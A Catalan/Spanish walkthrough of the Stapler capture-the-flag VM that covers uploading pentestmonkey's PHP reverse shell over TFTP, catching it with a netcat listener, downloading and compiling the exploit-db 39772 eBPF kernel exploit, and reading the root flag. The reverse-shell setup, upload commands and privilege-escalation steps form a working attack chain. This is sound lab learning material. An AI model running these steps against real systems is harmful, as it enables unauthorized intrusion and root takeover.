Amb el navegador Kali accediu a Github i descarregueu el fitxer php de reverse-shell:
```bash
https://github.com/pentestmonkey/php-reverse-shell
```

Deixeu-lo dins de la carpeta stapler.

A continuació, hem de modificar el codi font per indicar on voleu que es torni el shell invers (la vostra màquina Kali)

El $ip és l'adreça IP de la meva màquina Kali. Sabem que Kali està acostumat a fer servir el port 4444 amb Metasploit, de manera que també hauria de funcionar aquí.
Feu clic a Fitxer i des del menú contextual seleccioneu Desa. Obriu el fitxer i comproveu que s’han desat els canvis

### Obriu un terminal i configureu un oient mitjançant Netcat. Feu clic a Intro.
```bash
nc -lvnp 4444
┌──(kali㉿kali)-[~/stapler]
└─$ nc -v -n -l -p 4444
```

Antes intente cargar el codigo de php reverse shell dentro de una foto con exito, pero el servidor no interpreto el codigo php:
```bash
┌──(kali㉿kali)-[~/stapler]
└─$ jhead -cl "$(cat temp.txt)" reverse.jpg
```

Ver el contenido de la foto:
```bash
jhead reverse.jpg
```

## Ahora procedo a colocar el php para la reverse shell en el servidor mediante ftp:
```bash
┌──(kali㉿kali)-[~/stapler]
└─$ tftp 192.168.1.203

tftp> verbose
Verbose mode on.

tftp> put php-reverse-shell.php
putting php-reverse-shell.php to 192.168.1.203:php-reverse-shell.php [netascii]
Sent 3536 bytes in 0.1 seconds [323513 bit/s]
```

### Explicación:
1. Conectarte al servidor TFTP en la dirección 192.168.1.203: Al usar el comando tftp 192.168.1.203, iniciaste una sesión TFTP con el servidor que corre en esa dirección IP.

2. Habilitar el modo verboso: Al ingresar verbose, activaste el modo verboso, lo que hace que TFTP muestre más detalles sobre lo que está haciendo. Esto es útil para el diagnóstico y para entender mejor el proceso de transferencia.

3. Transferir el archivo: Con el comando put php-reverse-shell.php, enviaste el archivo php-reverse-shell.php desde tu máquina local al servidor. 

Ahora solo basta con colocar esto en la url para que se ejecute el php:
http://192.168.1.203/php-reverse-shell.php

Y ya tenemos acceso al sistema con privilegios limitados:
```bash
┌──(kali㉿kali)-[~/stapler]
└─$ nc -v -n -l -p 4444

listening on [any] 4444 ...
connect to [192.168.1.204] from (UNKNOWN) [192.168.1.203] 41108
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
 01:19:49 up  6:11,  0 users,  load average: 0.00, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1028(www) gid=1028(www) groups=1028(www)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
```

### Escalar privilegios:

Mitjançant searchsploit descobrim que Ubuntu 16.04 32 bits disposa d’una vulnerabilitat que podem utilitzar per escalar privilegis, 39772.txt

Procedo a descsargar el exploit:
```bash

$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
--2024-03-02 03:12:04--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7025 (6.9K) [application/octet-stream]
Saving to: ‘39772.zip’

     0K ......                                                100% 39.4M=0s

2024-03-02 03:12:04 (39.4 MB/s) - ‘39772.zip’ saved [7025/7025]

$ ls
39772.zip
autoroot.sh
README.md
xtra
$ unzip 39772.zip
Archive:  39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store         
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store  
  inflating: 39772/crasher.tar       
  inflating: __MACOSX/39772/._crasher.tar  
  inflating: 39772/exploit.tar       
  inflating: __MACOSX/39772/._exploit.tar  
$ ls
39772
39772.zip
autoroot.sh
__MACOSX
README.md
xtra
$ cd 39772
$ ls
crasher.tar
exploit.tar
$ tar xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
$ ls
crasher.tar
ebpf_mapfd_doubleput_exploit
exploit.tar
$ cd ebpf_mapfd_doubleput_exploit
$ ls
compile.sh
doubleput.c
hello.c
suidhelper.c
$ chmod +x compile.sh
$ ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
$ ls
compile.sh
doubleput
doubleput.c
hello
hello.c
suidhelper
suidhelper.c
$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
```

## En este punto ya soy root de la maquina.
```bash
id
uid=0(root) gid=0(root) groups=0(root),1028(www)
cd /root    
ls -la
total 208
drwx------  4 root root  4096 Mar  1 19:09 .
drwxr-xr-x 22 root root  4096 Jun  7  2016 ..
-rw-------  1 root root     1 Jun  5  2016 .bash_history
-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh
-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt
-rw-r--r--  1 root root   345 Jun  5  2016 issue
-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf
-rw-------  1 root root     1 Jun  5  2016 .mysql_history
drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh
-rw-------  1 root root  1024 Jun  5  2016 .rnd
drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
-rw-------  1 root root     1 Jun  5  2016 .viminfo
-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql
-rw-r--r--  1 root root 39206 Jun  3  2016 .zcompdump
-rw-r--r--  1 root root 39352 Jun  3  2016 .zcompdump-red-5.1.1
-rw-------  1 root root    39 Jun  5  2016 .zsh_history
-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc
-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update
cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```
Un comando que puede ser util:
```bash
copiar elcontenido del fichero php en el portapapeles:
xclip -sel clip < php-reverse-shell.php 
```
